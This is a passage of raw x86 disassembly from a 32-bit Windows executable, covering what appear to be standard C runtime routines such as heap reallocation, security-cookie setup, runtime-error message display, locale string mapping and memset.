  425988:	push   edi
  425989:	push   ebx
  42598a:	push   DWORD PTR ds:0x45d140
  425990:	call   DWORD PTR ds:0x4280b4
  425996:	mov    DWORD PTR [ebp-0x1c],eax
  425999:	mov    eax,DWORD PTR [ebp-0x1c]
  42599c:	cmp    eax,ebx
  42599e:	jne    0x425a00
  4259a0:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259a6:	je     0x425a00
  4259a8:	push   esi
  4259a9:	call   0x426192
  4259ae:	pop    ecx
  4259af:	test   eax,eax
  4259b1:	jne    0x42589c
  4259b7:	jmp    0x4259fe
  4259b9:	xor    ebx,ebx
  4259bb:	mov    esi,DWORD PTR [ebp+0xc]
  4259be:	mov    edi,DWORD PTR [ebp+0x8]
  4259c1:	push   0x4
  4259c3:	call   0x4239db
  4259c8:	pop    ecx
  4259c9:	ret    
  4259ca:	xor    eax,eax
  4259cc:	cmp    esi,0xffffffe0
  4259cf:	ja     0x4259e7
  4259d1:	cmp    esi,ebx
  4259d3:	jne    0x4259d8
  4259d5:	xor    esi,esi
  4259d7:	inc    esi
  4259d8:	push   esi
  4259d9:	push   edi
  4259da:	push   ebx
  4259db:	push   DWORD PTR ds:0x45d140
  4259e1:	call   DWORD PTR ds:0x4280b4
  4259e7:	cmp    eax,ebx
  4259e9:	jne    0x425a00
  4259eb:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259f1:	je     0x425a00
  4259f3:	push   esi
  4259f4:	call   0x426192
  4259f9:	pop    ecx
  4259fa:	test   eax,eax
  4259fc:	jne    0x4259ca
  4259fe:	xor    eax,eax
  425a00:	call   0x4238e3
  425a05:	ret    
  425a06:	push   0x10
  425a08:	push   0x428780
  425a0d:	call   0x4238a8
  425a12:	cmp    DWORD PTR ds:0x45d144,0x3
  425a19:	jne    0x425a55
  425a1b:	push   0x4
  425a1d:	call   0x423a6f
  425a22:	pop    ecx
  425a23:	and    DWORD PTR [ebp-0x4],0x0
  425a27:	mov    esi,DWORD PTR [ebp+0x8]
  425a2a:	push   esi
  425a2b:	call   0x424c92
  425a30:	pop    ecx
  425a31:	mov    DWORD PTR [ebp-0x1c],eax
  425a34:	test   eax,eax
  425a36:	je     0x425a43
  425a38:	mov    esi,DWORD PTR [esi-0x4]
  425a3b:	sub    esi,0x9
  425a3e:	mov    DWORD PTR [ebp-0x20],esi
  425a41:	jmp    0x425a46
  425a43:	mov    esi,DWORD PTR [ebp-0x20]
  425a46:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a4a:	call   0x425a73
  425a4f:	cmp    DWORD PTR [ebp-0x1c],0x0
  425a53:	jne    0x425a68
  425a55:	push   DWORD PTR [ebp+0x8]
  425a58:	push   0x0
  425a5a:	push   DWORD PTR ds:0x45d140
  425a60:	call   DWORD PTR ds:0x4280b8
  425a66:	mov    esi,eax
  425a68:	mov    eax,esi
  425a6a:	call   0x4238e3
  425a6f:	ret    
  425a70:	mov    esi,DWORD PTR [ebp-0x20]
  425a73:	push   0x4
  425a75:	call   0x4239db
  425a7a:	pop    ecx
  425a7b:	ret    
  425a7c:	push   ebp
  425a7d:	mov    ebp,esp
  425a7f:	sub    esp,0x10
  425a82:	push   esi
  425a83:	lea    eax,[ebp-0x8]
  425a86:	push   eax
  425a87:	call   DWORD PTR ds:0x4280c8
  425a8d:	mov    esi,DWORD PTR [ebp-0x4]
  425a90:	xor    esi,DWORD PTR [ebp-0x8]
  425a93:	call   DWORD PTR ds:0x4280c4
  425a99:	xor    esi,eax
  425a9b:	call   DWORD PTR ds:0x428070
  425aa1:	xor    esi,eax
  425aa3:	call   DWORD PTR ds:0x4280c0
  425aa9:	xor    esi,eax
  425aab:	lea    eax,[ebp-0x10]
  425aae:	push   eax
  425aaf:	call   DWORD PTR ds:0x4280bc
  425ab5:	mov    eax,DWORD PTR [ebp-0xc]
  425ab8:	xor    eax,DWORD PTR [ebp-0x10]
  425abb:	xor    esi,eax
  425abd:	mov    DWORD PTR ds:0x45c430,esi
  425ac3:	jne    0x425acf
  425ac5:	mov    DWORD PTR ds:0x45c430,0xbb40e64e
  425acf:	pop    esi
  425ad0:	leave  
  425ad1:	ret    
  425ad2:	push   0x118
  425ad7:	push   0x428930
  425adc:	call   0x4238a8
  425ae1:	mov    eax,ds:0x45c430
  425ae6:	xor    eax,DWORD PTR [ebp+0x4]
  425ae9:	mov    DWORD PTR [ebp-0x1c],eax
  425aec:	mov    eax,ds:0x45cd98
  425af1:	xor    ecx,ecx
  425af3:	cmp    eax,ecx
  425af5:	je     0x425b16
  425af7:	mov    DWORD PTR [ebp-0x4],ecx
  425afa:	push   DWORD PTR [ebp+0xc]
  425afd:	push   DWORD PTR [ebp+0x8]
  425b00:	call   eax
  425b02:	pop    ecx
  425b03:	pop    ecx
  425b04:	or     DWORD PTR [ebp-0x4],0xffffffff
  425b08:	jmp    0x425c14
  425b0d:	xor    eax,eax
  425b0f:	inc    eax
  425b10:	ret    
  425b11:	mov    esp,DWORD PTR [ebp-0x18]
  425b14:	jmp    0x425b04
  425b16:	mov    eax,DWORD PTR [ebp+0x8]
  425b19:	dec    eax
  425b1a:	je     0x425b2f
  425b1c:	mov    edi,0x42890c
  425b21:	mov    DWORD PTR [ebp-0x20],0x428858
  425b28:	mov    esi,0xd4
  425b2d:	jmp    0x425b40
  425b2f:	mov    edi,0x428838
  425b34:	mov    DWORD PTR [ebp-0x20],0x428798
  425b3b:	mov    esi,0xb9
  425b40:	mov    BYTE PTR [ebp-0x24],cl
  425b43:	push   0x104
  425b48:	lea    eax,[ebp-0x128]
  425b4e:	push   eax
  425b4f:	push   ecx
  425b50:	call   DWORD PTR ds:0x428040
  425b56:	test   eax,eax
  425b58:	jne    0x425b6d
  425b5a:	push   0x42848c
  425b5f:	lea    eax,[ebp-0x128]
  425b65:	push   eax
  425b66:	call   0x423c90
  425b6b:	pop    ecx
  425b6c:	pop    ecx
  425b6d:	lea    ebx,[ebp-0x128]
  425b73:	lea    eax,[ebp-0x128]
  425b79:	push   eax
  425b7a:	call   0x423ec0
  425b7f:	pop    ecx
  425b80:	add    eax,0xb
  425b83:	cmp    eax,0x3c
  425b86:	jbe    0x425bb1
  425b88:	lea    eax,[ebp-0x128]
  425b8e:	push   eax
  425b8f:	call   0x423ec0
  425b94:	mov    ebx,eax
  425b96:	lea    eax,[ebp-0x128]
  425b9c:	sub    eax,0x31
  425b9f:	add    ebx,eax
  425ba1:	push   0x3
  425ba3:	push   0x428488
  425ba8:	push   ebx
  425ba9:	call   0x423d90
  425bae:	add    esp,0x10
  425bb1:	push   ebx
  425bb2:	call   0x423ec0
  425bb7:	pop    ecx
  425bb8:	lea    eax,[eax+esi*1+0xc]
  425bbc:	add    eax,0x3
  425bbf:	and    eax,0xfffffffc
  425bc2:	call   0x423900
  425bc7:	mov    DWORD PTR [ebp-0x18],esp
  425bca:	mov    esi,esp
  425bcc:	push   edi
  425bcd:	push   esi
  425bce:	call   0x423c90
  425bd3:	mov    edi,0x428468
  425bd8:	push   edi
  425bd9:	push   esi
  425bda:	call   0x423ca0
  425bdf:	push   0x42878c
  425be4:	push   esi
  425be5:	call   0x423ca0
  425bea:	push   ebx
  425beb:	push   esi
  425bec:	call   0x423ca0
  425bf1:	push   edi
  425bf2:	push   esi
  425bf3:	call   0x423ca0
  425bf8:	push   DWORD PTR [ebp-0x20]
  425bfb:	push   esi
  425bfc:	call   0x423ca0
  425c01:	push   0x12010
  425c06:	push   0x428440
  425c0b:	push   esi
  425c0c:	call   0x423b92
  425c11:	add    esp,0x3c
  425c14:	push   0x3
  425c16:	call   0x422d16
  425c1b:	int3   
  425c1c:	push   0x38
  425c1e:	push   0x428d50
  425c23:	call   0x4238a8
  425c28:	xor    ebx,ebx
  425c2a:	cmp    DWORD PTR ds:0x45cdbc,ebx
  425c30:	jne    0x425c6a
  425c32:	push   ebx
  425c33:	push   ebx
  425c34:	xor    esi,esi
  425c36:	inc    esi
  425c37:	push   esi
  425c38:	push   0x428d4c
  425c3d:	push   0x100
  425c42:	push   ebx
  425c43:	call   DWORD PTR ds:0x4280d4
  425c49:	test   eax,eax
  425c4b:	je     0x425c55
  425c4d:	mov    DWORD PTR ds:0x45cdbc,esi
  425c53:	jmp    0x425c6a
  425c55:	call   DWORD PTR ds:0x428014
  425c5b:	cmp    eax,0x78
  425c5e:	jne    0x425c6a
  425c60:	mov    DWORD PTR ds:0x45cdbc,0x2
  425c6a:	cmp    DWORD PTR [ebp+0x14],ebx
  425c6d:	jle    0x425c8a
  425c6f:	mov    ecx,DWORD PTR [ebp+0x14]
  425c72:	mov    eax,DWORD PTR [ebp+0x10]
  425c75:	dec    ecx
  425c76:	cmp    BYTE PTR [eax],bl
  425c78:	je     0x425c82
  425c7a:	inc    eax
  425c7b:	cmp    ecx,ebx
  425c7d:	jne    0x425c75
  425c7f:	or     ecx,0xffffffff
  425c82:	or     eax,0xffffffff
  425c85:	sub    eax,ecx
  425c87:	add    DWORD PTR [ebp+0x14],eax
  425c8a:	mov    eax,ds:0x45cdbc
  425c8f:	cmp    eax,0x2
  425c92:	je     0x425e74
  425c98:	cmp    eax,ebx
  425c9a:	je     0x425e74
  425ca0:	cmp    eax,0x1
  425ca3:	jne    0x425ea7
  425ca9:	xor    edi,edi
  425cab:	mov    DWORD PTR [ebp-0x1c],edi
  425cae:	mov    DWORD PTR [ebp-0x20],ebx
  425cb1:	mov    DWORD PTR [ebp-0x24],ebx
  425cb4:	cmp    DWORD PTR [ebp+0x20],ebx
  425cb7:	jne    0x425cc1
  425cb9:	mov    eax,ds:0x45cdb4
  425cbe:	mov    DWORD PTR [ebp+0x20],eax
  425cc1:	push   ebx
  425cc2:	push   ebx
  425cc3:	push   DWORD PTR [ebp+0x14]
  425cc6:	push   DWORD PTR [ebp+0x10]
  425cc9:	xor    eax,eax
  425ccb:	cmp    DWORD PTR [ebp+0x24],ebx
  425cce:	setne  al
  425cd1:	lea    eax,[eax*8+0x1]
  425cd8:	push   eax
  425cd9:	push   DWORD PTR [ebp+0x20]
  425cdc:	call   DWORD PTR ds:0x4280d0
  425ce2:	mov    esi,eax
  425ce4:	mov    DWORD PTR [ebp-0x28],esi
  425ce7:	cmp    esi,ebx
  425ce9:	je     0x425ea7
  425cef:	mov    DWORD PTR [ebp-0x4],0x1
  425cf6:	lea    eax,[esi+esi*1]
  425cf9:	add    eax,0x3
  425cfc:	and    eax,0xfffffffc
  425cff:	call   0x423900
  425d04:	mov    DWORD PTR [ebp-0x18],esp
  425d07:	mov    eax,esp
  425d09:	mov    DWORD PTR [ebp-0x2c],eax
  425d0c:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d10:	jmp    0x425d2d
  425d12:	xor    eax,eax
  425d14:	inc    eax
  425d15:	ret    
  425d16:	mov    esp,DWORD PTR [ebp-0x18]
  425d19:	call   0x426d45
  425d1e:	xor    ebx,ebx
  425d20:	mov    DWORD PTR [ebp-0x2c],ebx
  425d23:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d27:	mov    edi,DWORD PTR [ebp-0x1c]
  425d2a:	mov    esi,DWORD PTR [ebp-0x28]
  425d2d:	cmp    DWORD PTR [ebp-0x2c],ebx
  425d30:	jne    0x425d4e
  425d32:	lea    eax,[esi+esi*1]
  425d35:	push   eax
  425d36:	call   0x4245d2
  425d3b:	pop    ecx
  425d3c:	mov    DWORD PTR [ebp-0x2c],eax
  425d3f:	cmp    eax,ebx
  425d41:	je     0x425ea7
  425d47:	mov    DWORD PTR [ebp-0x20],0x1
  425d4e:	push   esi
  425d4f:	push   DWORD PTR [ebp-0x2c]
  425d52:	push   DWORD PTR [ebp+0x14]
  425d55:	push   DWORD PTR [ebp+0x10]
  425d58:	push   0x1
  425d5a:	push   DWORD PTR [ebp+0x20]
  425d5d:	call   DWORD PTR ds:0x4280d0
  425d63:	test   eax,eax
  425d65:	je     0x425e51
  425d6b:	push   ebx
  425d6c:	push   ebx
  425d6d:	push   esi
  425d6e:	push   DWORD PTR [ebp-0x2c]
  425d71:	push   DWORD PTR [ebp+0xc]
  425d74:	push   DWORD PTR [ebp+0x8]
  425d77:	call   DWORD PTR ds:0x4280d4
  425d7d:	mov    edi,eax
  425d7f:	mov    DWORD PTR [ebp-0x1c],edi
  425d82:	cmp    edi,ebx
  425d84:	je     0x425e51
  425d8a:	test   BYTE PTR [ebp+0xd],0x4
  425d8e:	je     0x425dbd
  425d90:	cmp    DWORD PTR [ebp+0x1c],ebx
  425d93:	je     0x425e51
  425d99:	cmp    edi,DWORD PTR [ebp+0x1c]
  425d9c:	jg     0x425e51
  425da2:	push   DWORD PTR [ebp+0x1c]
  425da5:	push   DWORD PTR [ebp+0x18]
  425da8:	push   esi
  425da9:	push   DWORD PTR [ebp-0x2c]
  425dac:	push   DWORD PTR [ebp+0xc]
  425daf:	push   DWORD PTR [ebp+0x8]
  425db2:	call   DWORD PTR ds:0x4280d4
  425db8:	jmp    0x425e51
  425dbd:	mov    DWORD PTR [ebp-0x4],0x2
  425dc4:	lea    eax,[edi+edi*1]
  425dc7:	add    eax,0x3
  425dca:	and    eax,0xfffffffc
  425dcd:	call   0x423900
  425dd2:	mov    DWORD PTR [ebp-0x18],esp
  425dd5:	mov    eax,esp
  425dd7:	mov    DWORD PTR [ebp-0x30],eax
  425dda:	or     DWORD PTR [ebp-0x4],0xffffffff
  425dde:	jmp    0x425dfb
  425de0:	xor    eax,eax
  425de2:	inc    eax
  425de3:	ret    
  425de4:	mov    esp,DWORD PTR [ebp-0x18]
  425de7:	call   0x426d45
  425dec:	xor    ebx,ebx
  425dee:	mov    DWORD PTR [ebp-0x30],ebx
  425df1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425df5:	mov    edi,DWORD PTR [ebp-0x1c]
  425df8:	mov    esi,DWORD PTR [ebp-0x28]
  425dfb:	cmp    DWORD PTR [ebp-0x30],ebx
  425dfe:	jne    0x425e18
  425e00:	lea    eax,[edi+edi*1]
  425e03:	push   eax
  425e04:	call   0x4245d2
  425e09:	pop    ecx
  425e0a:	mov    DWORD PTR [ebp-0x30],eax
  425e0d:	cmp    eax,ebx
  425e0f:	je     0x425e51
  425e11:	mov    DWORD PTR [ebp-0x24],0x1
  425e18:	push   edi
  425e19:	push   DWORD PTR [ebp-0x30]
  425e1c:	push   esi
  425e1d:	push   DWORD PTR [ebp-0x2c]
  425e20:	push   DWORD PTR [ebp+0xc]
  425e23:	push   DWORD PTR [ebp+0x8]
  425e26:	call   DWORD PTR ds:0x4280d4
  425e2c:	test   eax,eax
  425e2e:	je     0x425e51
  425e30:	push   ebx
  425e31:	push   ebx
  425e32:	cmp    DWORD PTR [ebp+0x1c],ebx
  425e35:	jne    0x425e3b
  425e37:	push   ebx
  425e38:	push   ebx
  425e39:	jmp    0x425e41
  425e3b:	push   DWORD PTR [ebp+0x1c]
  425e3e:	push   DWORD PTR [ebp+0x18]
  425e41:	push   edi
  425e42:	push   DWORD PTR [ebp-0x30]
  425e45:	push   ebx
  425e46:	push   DWORD PTR [ebp+0x20]
  425e49:	call   DWORD PTR ds:0x428054
  425e4f:	mov    edi,eax
  425e51:	cmp    DWORD PTR [ebp-0x24],ebx
  425e54:	je     0x425e5f
  425e56:	push   DWORD PTR [ebp-0x30]
  425e59:	call   0x4244ba
  425e5e:	pop    ecx
  425e5f:	cmp    DWORD PTR [ebp-0x20],ebx
  425e62:	je     0x425e6d
  425e64:	push   DWORD PTR [ebp-0x2c]
  425e67:	call   0x4244ba
  425e6c:	pop    ecx
  425e6d:	mov    eax,edi
  425e6f:	jmp    0x425fcf
  425e74:	mov    DWORD PTR [ebp-0x34],ebx
  425e77:	xor    edi,edi
  425e79:	mov    DWORD PTR [ebp-0x38],ebx
  425e7c:	cmp    DWORD PTR [ebp+0x8],ebx
  425e7f:	jne    0x425e89
  425e81:	mov    eax,ds:0x45cda4
  425e86:	mov    DWORD PTR [ebp+0x8],eax
  425e89:	cmp    DWORD PTR [ebp+0x20],ebx
  425e8c:	jne    0x425e96
  425e8e:	mov    eax,ds:0x45cdb4
  425e93:	mov    DWORD PTR [ebp+0x20],eax
  425e96:	push   DWORD PTR [ebp+0x8]
  425e99:	call   0x426b2d
  425e9e:	pop    ecx
  425e9f:	mov    DWORD PTR [ebp-0x3c],eax
  425ea2:	cmp    eax,0xffffffff
  425ea5:	jne    0x425eae
  425ea7:	xor    eax,eax
  425ea9:	jmp    0x425fcf
  425eae:	cmp    eax,DWORD PTR [ebp+0x20]
  425eb1:	je     0x425fa5
  425eb7:	push   ebx
  425eb8:	push   ebx
  425eb9:	lea    ecx,[ebp+0x14]
  425ebc:	push   ecx
  425ebd:	push   DWORD PTR [ebp+0x10]
  425ec0:	push   eax
  425ec1:	push   DWORD PTR [ebp+0x20]
  425ec4:	call   0x426b76
  425ec9:	add    esp,0x18
  425ecc:	mov    DWORD PTR [ebp-0x34],eax
  425ecf:	cmp    eax,ebx
  425ed1:	je     0x425ea7
  425ed3:	push   ebx
  425ed4:	push   ebx
  425ed5:	push   DWORD PTR [ebp+0x14]
  425ed8:	push   eax
  425ed9:	push   DWORD PTR [ebp+0xc]
  425edc:	push   DWORD PTR [ebp+0x8]
  425edf:	call   DWORD PTR ds:0x4280cc
  425ee5:	mov    esi,eax
  425ee7:	mov    DWORD PTR [ebp-0x40],esi
  425eea:	cmp    esi,ebx
  425eec:	je     0x425f94
  425ef2:	mov    DWORD PTR [ebp-0x4],ebx
  425ef5:	add    eax,0x3
  425ef8:	and    eax,0xfffffffc
  425efb:	call   0x423900
  425f00:	mov    DWORD PTR [ebp-0x18],esp
  425f03:	mov    edi,esp
  425f05:	mov    DWORD PTR [ebp-0x44],edi
  425f08:	push   esi
  425f09:	push   ebx
  425f0a:	push   edi
  425f0b:	call   0x4261b0
  425f10:	add    esp,0xc
  425f13:	jmp    0x425f25
  425f15:	xor    eax,eax
  425f17:	inc    eax
  425f18:	ret    
  425f19:	mov    esp,DWORD PTR [ebp-0x18]
  425f1c:	call   0x426d45
  425f21:	xor    ebx,ebx
  425f23:	xor    edi,edi
  425f25:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f29:	cmp    edi,ebx
  425f2b:	jne    0x425f50
  425f2d:	push   DWORD PTR [ebp-0x40]
  425f30:	call   0x4245d2
  425f35:	pop    ecx
  425f36:	mov    edi,eax
  425f38:	cmp    edi,ebx
  425f3a:	je     0x425f6d
  425f3c:	push   DWORD PTR [ebp-0x40]
  425f3f:	push   ebx
  425f40:	push   edi
  425f41:	call   0x4261b0
  425f46:	add    esp,0xc
  425f49:	mov    DWORD PTR [ebp-0x38],0x1
  425f50:	push   DWORD PTR [ebp-0x40]
  425f53:	push   edi
  425f54:	push   DWORD PTR [ebp+0x14]
  425f57:	push   DWORD PTR [ebp-0x34]
  425f5a:	push   DWORD PTR [ebp+0xc]
  425f5d:	push   DWORD PTR [ebp+0x8]
  425f60:	call   DWORD PTR ds:0x4280cc
  425f66:	mov    DWORD PTR [ebp-0x40],eax
  425f69:	cmp    eax,ebx
  425f6b:	jne    0x425f71
  425f6d:	xor    esi,esi
  425f6f:	jmp    0x425f97
  425f71:	push   DWORD PTR [ebp+0x1c]
  425f74:	push   DWORD PTR [ebp+0x18]
  425f77:	lea    eax,[ebp-0x40]
  425f7a:	push   eax
  425f7b:	push   edi
  425f7c:	push   DWORD PTR [ebp+0x20]
  425f7f:	push   DWORD PTR [ebp-0x3c]
  425f82:	call   0x426b76
  425f87:	add    esp,0x18
  425f8a:	mov    esi,eax
  425f8c:	neg    esi
  425f8e:	sbb    esi,esi
  425f90:	neg    esi
  425f92:	jmp    0x425f97
  425f94:	mov    esi,DWORD PTR [ebp-0x48]
  425f97:	cmp    DWORD PTR [ebp-0x38],ebx
  425f9a:	je     0x425fbf
  425f9c:	push   edi
  425f9d:	call   0x4244ba
  425fa2:	pop    ecx
  425fa3:	jmp    0x425fbf
  425fa5:	push   DWORD PTR [ebp+0x1c]
  425fa8:	push   DWORD PTR [ebp+0x18]
  425fab:	push   DWORD PTR [ebp+0x14]
  425fae:	push   DWORD PTR [ebp+0x10]
  425fb1:	push   DWORD PTR [ebp+0xc]
  425fb4:	push   DWORD PTR [ebp+0x8]
  425fb7:	call   DWORD PTR ds:0x4280cc
  425fbd:	mov    esi,eax
  425fbf:	cmp    DWORD PTR [ebp-0x34],ebx
  425fc2:	je     0x425fcd
  425fc4:	push   DWORD PTR [ebp-0x34]
  425fc7:	call   0x4244ba
  425fcc:	pop    ecx
  425fcd:	mov    eax,esi
  425fcf:	lea    esp,[ebp-0x54]
  425fd2:	call   0x4238e3
  425fd7:	ret    
  425fd8:	push   0x1c
  425fda:	push   0x428d78
  425fdf:	call   0x4238a8
  425fe4:	xor    esi,esi
  425fe6:	cmp    DWORD PTR ds:0x45cdc0,esi
  425fec:	jne    0x426023
  425fee:	lea    eax,[ebp-0x1c]
  425ff1:	push   eax
  425ff2:	xor    edi,edi
  425ff4:	inc    edi
  425ff5:	push   edi
  425ff6:	push   0x428d4c
  425ffb:	push   edi
  425ffc:	call   DWORD PTR ds:0x4280dc
  426002:	test   eax,eax
  426004:	je     0x42600e
  426006:	mov    DWORD PTR ds:0x45cdc0,edi
  42600c:	jmp    0x426023
  42600e:	call   DWORD PTR ds:0x428014
  426014:	cmp    eax,0x78
  426017:	jne    0x426023
  426019:	mov    DWORD PTR ds:0x45cdc0,0x2
  426023:	mov    eax,ds:0x45cdc0
  426028:	cmp    eax,0x2
  42602b:	je     0x42611b
  426031:	cmp    eax,esi
  426033:	je     0x42611b
  426039:	cmp    eax,0x1
  42603c:	jne    0x426141
  426042:	mov    DWORD PTR [ebp-0x20],esi
  426045:	mov    DWORD PTR [ebp-0x24],esi
  426048:	cmp    DWORD PTR [ebp+0x18],esi
  42604b:	jne    0x426055
  42604d:	mov    eax,ds:0x45cdb4
  426052:	mov    DWORD PTR [ebp+0x18],eax
  426055:	push   esi
  426056:	push   esi
  426057:	push   DWORD PTR [ebp+0x10]
  42605a:	push   DWORD PTR [ebp+0xc]
  42605d:	xor    eax,eax
  42605f:	cmp    DWORD PTR [ebp+0x20],esi
  426062:	setne  al
  426065:	lea    eax,[eax*8+0x1]
  42606c:	push   eax
  42606d:	push   DWORD PTR [ebp+0x18]
  426070:	call   DWORD PTR ds:0x4280d0
  426076:	mov    edi,eax
  426078:	mov    DWORD PTR [ebp-0x28],edi
  42607b:	test   edi,edi
  42607d:	je     0x426141
  426083:	and    DWORD PTR [ebp-0x4],0x0
  426087:	lea    ebx,[edi+edi*1]
  42608a:	mov    eax,ebx
  42608c:	add    eax,0x3
  42608f:	and    eax,0xfffffffc
  426092:	call   0x423900
  426097:	mov    DWORD PTR [ebp-0x18],esp
  42609a:	mov    esi,esp
  42609c:	mov    DWORD PTR [ebp-0x2c],esi
  42609f:	push   ebx
  4260a0:	push   0x0
  4260a2:	push   esi
  4260a3:	call   0x4261b0
  4260a8:	add    esp,0xc
  4260ab:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260af:	jmp    0x4260c6
  4260b1:	xor    eax,eax
  4260b3:	inc    eax
  4260b4:	ret    
  4260b5:	mov    esp,DWORD PTR [ebp-0x18]
  4260b8:	call   0x426d45
  4260bd:	xor    esi,esi
  4260bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260c3:	mov    edi,DWORD PTR [ebp-0x28]
  4260c6:	test   esi,esi
  4260c8:	jne    0x4260e1
  4260ca:	push   edi
  4260cb:	push   0x2
  4260cd:	call   0x4249c8
  4260d2:	pop    ecx
  4260d3:	pop    ecx
  4260d4:	mov    esi,eax
  4260d6:	test   esi,esi
  4260d8:	je     0x426141
  4260da:	mov    DWORD PTR [ebp-0x24],0x1
  4260e1:	push   edi
  4260e2:	push   esi
  4260e3:	push   DWORD PTR [ebp+0x10]
  4260e6:	push   DWORD PTR [ebp+0xc]
  4260e9:	push   0x1
  4260eb:	push   DWORD PTR [ebp+0x18]
  4260ee:	call   DWORD PTR ds:0x4280d0
  4260f4:	test   eax,eax
  4260f6:	je     0x426109
  4260f8:	push   DWORD PTR [ebp+0x14]
  4260fb:	push   eax
  4260fc:	push   esi
  4260fd:	push   DWORD PTR [ebp+0x8]
  426100:	call   DWORD PTR ds:0x4280dc
  426106:	mov    DWORD PTR [ebp-0x20],eax
  426109:	cmp    DWORD PTR [ebp-0x24],0x0
  42610d:	je     0x426116
  42610f:	push   esi
  426110:	call   0x4244ba
  426115:	pop    ecx
  426116:	mov    eax,DWORD PTR [ebp-0x20]
  426119:	jmp    0x426189
  42611b:	mov    ebx,DWORD PTR [ebp+0x1c]
  42611e:	cmp    ebx,esi
  426120:	jne    0x426128
  426122:	mov    ebx,DWORD PTR ds:0x45cda4
  426128:	mov    edi,DWORD PTR [ebp+0x18]
  42612b:	test   edi,edi
  42612d:	jne    0x426135
  42612f:	mov    edi,DWORD PTR ds:0x45cdb4
  426135:	push   ebx
  426136:	call   0x426b2d
  42613b:	pop    ecx
  42613c:	cmp    eax,0xffffffff
  42613f:	jne    0x426145
  426141:	xor    eax,eax
  426143:	jmp    0x426189
  426145:	cmp    eax,edi
  426147:	je     0x426167
  426149:	push   0x0
  42614b:	push   0x0
  42614d:	lea    ecx,[ebp+0x10]
  426150:	push   ecx
  426151:	push   DWORD PTR [ebp+0xc]
  426154:	push   eax
  426155:	push   edi
  426156:	call   0x426b76
  42615b:	add    esp,0x18
  42615e:	mov    esi,eax
  426160:	test   esi,esi
  426162:	je     0x426141
  426164:	mov    DWORD PTR [ebp+0xc],esi
  426167:	push   DWORD PTR [ebp+0x14]
  42616a:	push   DWORD PTR [ebp+0x10]
  42616d:	push   DWORD PTR [ebp+0xc]
  426170:	push   DWORD PTR [ebp+0x8]
  426173:	push   ebx
  426174:	call   DWORD PTR ds:0x4280d8
  42617a:	mov    edi,eax
  42617c:	test   esi,esi
  42617e:	je     0x426187
  426180:	push   esi
  426181:	call   0x4244ba
  426186:	pop    ecx
  426187:	mov    eax,edi
  426189:	lea    esp,[ebp-0x38]
  42618c:	call   0x4238e3
  426191:	ret    
  426192:	mov    eax,ds:0x45cdc4
  426197:	test   eax,eax
  426199:	je     0x4261aa
  42619b:	push   DWORD PTR [esp+0x4]
  42619f:	call   eax
  4261a1:	test   eax,eax
  4261a3:	pop    ecx
  4261a4:	je     0x4261aa
  4261a6:	xor    eax,eax
  4261a8:	inc    eax
  4261a9:	ret    
  4261aa:	xor    eax,eax
  4261ac:	ret    
  4261ad:	int3   
  4261ae:	int3   
  4261af:	int3   
  4261b0:	mov    edx,DWORD PTR [esp+0xc]
  4261b4:	mov    ecx,DWORD PTR [esp+0x4]
  4261b8:	test   edx,edx
  4261ba:	je     0x42620b
  4261bc:	xor    eax,eax
  4261be:	mov    al,BYTE PTR [esp+0x8]
  4261c2:	push   edi
  4261c3:	mov    edi,ecx
  4261c5:	cmp    edx,0x4
  4261c8:	jb     0x4261fb
  4261ca:	neg    ecx
  4261cc:	and    ecx,0x3
  4261cf:	je     0x4261dd
  4261d1:	sub    edx,ecx
  4261d3:	mov    BYTE PTR [edi],al
  4261d5:	add    edi,0x1
  4261d8:	sub    ecx,0x1
  4261db:	jne    0x4261d3
  4261dd:	mov    ecx,eax
  4261df:	shl    eax,0x8
  4261e2:	add    eax,ecx
  4261e4:	mov    ecx,eax
  4261e6:	shl    eax,0x10
  4261e9:	add    eax,ecx
  4261eb:	mov    ecx,edx
  4261ed:	and    edx,0x3
  4261f0:	shr    ecx,0x2
  4261f3:	je     0x4261fb
  4261f5:	rep stos DWORD PTR es:[edi],eax
  4261f7:	test   edx,edx
  4261f9:	je     0x426205
  4261fb:	mov    BYTE PTR [edi],al
  4261fd:	add    edi,0x1
  426200:	sub    edx,0x1
  426203:	jne    0x4261fb
  426205:	mov    eax,DWORD PTR [esp+0x8]
  426209:	pop    edi
  42620a:	ret    
  42620b:	mov    eax,DWORD PTR [esp+0x4]
  42620f:	ret    
  426210:	push   esi
  426211:	mov    esi,DWORD PTR [esp+0x8]
  426215:	test   esi,esi
  426217:	je     0x42639e
  42621d:	push   DWORD PTR [esi+0x4]
  426220:	call   0x4244ba
  426225:	push   DWORD PTR [esi+0x8]
  426228:	call   0x4244ba
  42622d:	push   DWORD PTR [esi+0xc]
  426230:	call   0x4244ba
  426235:	push   DWORD PTR [esi+0x10]
  426238:	call   0x4244ba
  42623d:	push   DWORD PTR [esi+0x14]
  426240:	call   0x4244ba
  426245:	push   DWORD PTR [esi+0x18]
  426248:	call   0x4244ba
  42624d:	push   DWORD PTR [esi]
  42624f:	call   0x4244ba
  426254:	push   DWORD PTR [esi+0x20]
  426257:	call   0x4244ba
  42625c:	push   DWORD PTR [esi+0x24]
  42625f:	call   0x4244ba
  426264:	push   DWORD PTR [esi+0x28]
  426267:	call   0x4244ba
  42626c:	push   DWORD PTR [esi+0x2c]
  42626f:	call   0x4244ba
  426274:	push   DWORD PTR [esi+0x30]
  426277:	call   0x4244ba
  42627c:	push   DWORD PTR [esi+0x34]
  42627f:	call   0x4244ba
  426284:	push   DWORD PTR [esi+0x1c]
  426287:	call   0x4244ba
  42628c:	push   DWORD PTR [esi+0x38]
  42628f:	call   0x4244ba
  426294:	push   DWORD PTR [esi+0x3c]
  426297:	call   0x4244ba
  42629c:	add    esp,0x40
  42629f:	push   DWORD PTR [esi+0x40]
  4262a2:	call   0x4244ba
  4262a7:	push   DWORD PTR [esi+0x44]
  4262aa:	call   0x4244ba
  4262af:	push   DWORD PTR [esi+0x48]
  4262b2:	call   0x4244ba
  4262b7:	push   DWORD PTR [esi+0x4c]
  4262ba:	call   0x4244ba
  4262bf:	push   DWORD PTR [esi+0x50]
  4262c2:	call   0x4244ba
  4262c7:	push   DWORD PTR [esi+0x54]
  4262ca:	call   0x4244ba
